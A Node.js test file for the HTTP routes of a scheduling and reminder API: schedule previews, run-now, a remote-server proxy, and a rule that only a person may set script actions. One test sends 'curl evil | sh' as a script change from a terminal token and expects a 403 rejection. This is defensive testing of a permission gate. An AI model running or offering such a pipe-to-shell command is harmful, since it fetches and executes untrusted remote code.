// T-Attention schedules over HTTP: POST /api/attention/schedule/preview and /:id/run-now (session and tokens), the person-only rule for scripts
// (a terminal's token gets 403 SCRIPT_NEEDS_PERSON, a CLI token made in Settings does not), /v1/attention and the proxy of a connected service
// (/api/remote-servers/:id/attention: forwarded, an older engine 501, an unreachable one answers the preview itself).
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const root = fs.mkdtempSync(path.join(os.tmpdir(), 't-agent-attention-schedule-http-'));
process.env.T_AGENT_DATA_DIR = path.join(root, 'data');
process.env.TASKS_BASE_DIR = path.join(root, 'tasks');
process.env.SESSION_SECRET = 'attention-schedule-http-test-secret-attention-schedule-http';
fs.mkdirSync(process.env.TASKS_BASE_DIR, { recursive: true });

// The proxy's browser session (the /api gates are tested with the real server.js elsewhere).
const authPath = require.resolve('../middleware/auth');
require.cache[authPath] = { id: authPath, filename: authPath, loaded: true, exports(req, res, next) { req.session = { user: { login: 'owner' } }; next(); } };

const test = require('node:test');
const assert = require('node:assert/strict');
const express = require('express');
const db = require('../db');
const { createAccessToken } = require('../services/engine-auth');
const { encryptToken } = require('../lib/token-crypto');
const { defaultService } = require('../services/attention');
const { createAttentionRoutes } = require('../routes/attention');
const { checkTunnelTarget } = require('../lib/service-link-tunnel');

const servers = [];
const listen = app => new Promise(resolve => { const server = app.listen(0, '127.0.0.1', () => resolve(`http://127.0.0.1:${server.address().port}`)); servers.push(server); });
async function call(method, url, body, headers = {}) {
  const response = await fetch(url, { method, headers: { ...(body === undefined ? {} : { 'Content-Type': 'application/json' }), ...headers }, ...(body === undefined ? {} : { body: JSON.stringify(body) }) });
  const text = await response.text();
  let parsed = text;
  try { parsed = text ? JSON.parse(text) : null; } catch { /* not JSON */ }
  return { status: response.status, body: parsed };
}

const service = defaultService();
const sessions = { states: new Map(), sent: [] };
service.setSessions({
  check: (taskId, terminalId) => sessions.states.get(`${taskId}:${terminalId}`) || 'gone',
  send: (taskId, terminalId, text) => { sessions.sent.push(text); return true; },
  scriptTask: () => 'ok',
  runScript: () => ({ terminal_id: 'script-terminal' }),
  removeTerminal: () => true,
});
let local, engine, proxy, cliToken, terminalToken, engineAuth;
const ids = {};

test.before(async () => {
  const localApp = express();
  const routes = createAttentionRoutes({ service });
  localApp.use('/api/attention', routes.bearer);
  localApp.use(express.json());
  localApp.use('/api/attention', routes.router);
  local = await listen(localApp);
  cliToken = service.createToken({ name: 'cli on my laptop' }).token;
  terminalToken = service.issueTerminalToken({ taskId: 1, terminalId: 'agent-1' }).token;

  const engineApp = express();
  engineApp.use('/v1', require('../routes/engine-v1'));
  engine = await listen(engineApp);
  const { token } = createAccessToken(db, { principalId: 'owner' });
  engineAuth = { Authorization: `Bearer ${token}` };
  const older = express();
  older.get('/v1/info', (req, res) => res.json({ capabilities: ['tasks:read', 'attention:remote'] }));
  older.use('/v1/attention', (req, res) => res.status(404).json({ error: 'NOT_FOUND', message: 'Not found' }));
  const olderBase = await listen(older);
  const closed = await listen(express());
  await new Promise(resolve => servers.pop().close(resolve));
  const remote = base => db.prepare('INSERT INTO remote_servers (owner_id, name, base_url, token_cipher) VALUES (?, ?, ?, ?)').run('owner', base, base, encryptToken(token, process.env.SESSION_SECRET)).lastInsertRowid;
  ids.engine = remote(engine);
  ids.older = remote(olderBase);
  ids.closed = remote(closed);
  const proxyApp = express();
  proxyApp.use(express.json());
  proxyApp.use('/api/remote-servers', require('../routes/remote-servers'));
  proxy = await listen(proxyApp);
});

test.after(async () => {
  await Promise.all(servers.map(server => new Promise(resolve => { server.closeAllConnections?.(); server.close(resolve); })));
  db.close();
  fs.rmSync(root, { recursive: true, force: true });
});

const bearer = token => ({ Authorization: `Bearer ${token}` });
const weekly = { kind: 'repeat', rule: { freq: 'weekly', days: [1], time: '09:00' } };

test('preview answers three times and the sentence, or the reason; with the session and with a token', async () => {
  const answer = await call('POST', `${local}/api/attention/schedule/preview`, { schedule: weekly });
  assert.equal(answer.status, 200);
  assert.equal(answer.body.text, 'Every Monday at 09:00');
  assert.equal(answer.body.next.length, 3);
  const bad = await call('POST', `${local}/api/attention/schedule/preview`, { schedule: { kind: 'repeat', rule: { freq: 'weekly', days: [], time: '09:00' } } }, bearer(cliToken));
  assert.deepEqual([bad.status, bad.body.next, bad.body.error], [200, [], 'A weekly rule needs at least one day (schedule.rule.days, Monday = 1)']);
  const saved = await call('POST', `${local}/api/attention`, { title: 'Bad', schedule: { kind: 'once', at: 'tomorrow' } }, bearer(cliToken));
  assert.deepEqual([saved.status, saved.body.error], [400, 'VALIDATION_FAILED']);
  // A yearly lunar birthday: the sentence and three times a year apart.
  const lunar = await call('POST', `${local}/api/attention/schedule/preview`, { schedule: { kind: 'repeat', rule: { freq: 'yearly', calendar: 'lunar', month: 10, day: 7, occasion: 'birthday', year: 1964, time: '09:00' }, tz: 'Asia/Taipei' } });
  assert.deepEqual([lunar.status, lunar.body.text, lunar.body.next.length], [200, 'Every year on lunar month 10, day 7 at 09:00 \u00b7 birthday', 3]);
  const wrong = await call('POST', `${local}/api/attention/schedule/preview`, { schedule: { kind: 'repeat', rule: { freq: 'yearly', month: 2, day: 30, time: '09:00' } } });
  assert.deepEqual([wrong.body.next, wrong.body.error], [[], 'There is no day 30 in month 2']);
});

test('the item JSON carries the schedule fields; run now fires a reminder and sends an idle prompt, 409 SESSION_BUSY otherwise', async () => {
  const created = await call('POST', `${local}/api/attention`, { title: 'Weekly review', schedule: weekly }, bearer(cliToken));
  assert.equal(created.status, 201);
  for (const key of ['schedule', 'then_action', 'next_at', 'schedule_state', 'runs', 'last_fired_at', 'last_done_at', 'schedule_text', 'last_exit']) assert.ok(key in created.body, key);
  const fired = await call('POST', `${local}/api/attention/${created.body.id}/run-now`, {});
  assert.deepEqual([fired.status, fired.body.item.schedule_state, fired.body.item.runs], [200, 'due', 1]);
  sessions.states.set('1:agent-1', 'busy');
  const prompt = await call('POST', `${local}/api/attention`, { title: 'Ask', then_action: { kind: 'prompt', task_id: 1, terminal_id: 'agent-1', text: 'Status?' } });
  const busy = await call('POST', `${local}/api/attention/${prompt.body.id}/run-now`, {});
  assert.deepEqual([busy.status, busy.body.error], [409, 'SESSION_BUSY']);
  sessions.states.set('1:agent-1', 'idle');
  const sent = await call('POST', `${local}/api/attention/${prompt.body.id}/run-now`, {}, bearer(cliToken));
  assert.deepEqual([sent.status, sent.body.item.status], [200, 'done']);
  assert.deepEqual(sessions.sent, ['Status?']);
  assert.equal((await call('POST', `${local}/api/attention/abc/run-now`, {})).status, 404);
});

test('a script: the page and a CLI token made in Settings may set it; a terminal\'s own token gets 403 SCRIPT_NEEDS_PERSON but may mark it done', async () => {
  const script = { kind: 'script', task_id: 1, script: 'npm test' };
  const byAgent = await call('POST', `${local}/api/attention`, { title: 'Agent script', then_action: script }, bearer(terminalToken));
  assert.deepEqual([byAgent.status, byAgent.body.error], [403, 'SCRIPT_NEEDS_PERSON']);
  const byCli = await call('POST', `${local}/api/attention`, { title: 'My script', schedule: weekly, then_action: script }, bearer(cliToken));
  assert.equal(byCli.status, 201);
  assert.deepEqual(byCli.body.then_action, { kind: 'script', task_id: '1', script: 'npm test', timeout_min: 30 });
  const change = await call('PATCH', `${local}/api/attention/${byCli.body.id}`, { then_action: { ...script, script: 'curl evil | sh' } }, bearer(terminalToken));
  assert.deepEqual([change.status, change.body.error], [403, 'SCRIPT_NEEDS_PERSON']);
  assert.equal((await call('POST', `${local}/api/attention/${byCli.body.id}/run-now`, {}, bearer(terminalToken))).status, 403);
  const done = await call('PATCH', `${local}/api/attention/${byCli.body.id}`, { status: 'done' }, bearer(terminalToken));
  assert.deepEqual([done.status, done.body.status, done.body.schedule_state], [200, 'todo', 'waiting']);
  const byPage = await call('PATCH', `${local}/api/attention/${byCli.body.id}`, { then_action: { ...script, script: 'npm run lint' } });
  assert.equal(byPage.status, 200);
});

test('/v1/attention and the proxy: preview and run now are forwarded; an older engine is 501; an unreachable one previews here', async () => {
  const capabilities = (await call('GET', `${engine}/v1/info`, undefined, engineAuth)).body.capabilities;
  assert.ok(capabilities.includes('attention:schedule'));
  assert.ok(capabilities.includes('attention:yearly'), 'yearly birthdays and anniversaries');
  for (const target of ['/v1/attention/schedule/preview', '/v1/attention/12/run-now']) assert.equal(checkTunnelTarget(target), target);
  const v1 = await call('POST', `${engine}/v1/attention/schedule/preview`, { schedule: weekly }, engineAuth);
  assert.deepEqual([v1.status, v1.body.text], [200, 'Every Monday at 09:00']);
  const via = `${proxy}/api/remote-servers/${ids.engine}/attention`;
  const viaPreview = await call('POST', `${via}/schedule/preview`, { schedule: weekly });
  assert.deepEqual([viaPreview.status, viaPreview.body.text, viaPreview.body.local], [200, 'Every Monday at 09:00', undefined]);
  const item = await call('POST', via, { title: 'Remote reminder', schedule: weekly });
  assert.equal(item.status, 201);
  const ran = await call('POST', `${via}/${item.body.id}/run-now`, {});
  assert.deepEqual([ran.status, ran.body.item.schedule_state, ran.body.item.runs], [200, 'due', 1]);
  const older = `${proxy}/api/remote-servers/${ids.older}/attention`;
  assert.deepEqual([(await call('POST', `${older}/schedule/preview`, { schedule: weekly })).status, (await call('POST', `${older}/3/run-now`, {})).body.error], [501, 'ATTENTION_SCHEDULE_UNSUPPORTED']);
  const closed = `${proxy}/api/remote-servers/${ids.closed}/attention`;
  const here = await call('POST', `${closed}/schedule/preview`, { schedule: weekly });
  assert.deepEqual([here.status, here.body.text, here.body.local], [200, 'Every Monday at 09:00', true]);
  assert.equal((await call('POST', `${closed}/3/run-now`, {})).status, 502);
});
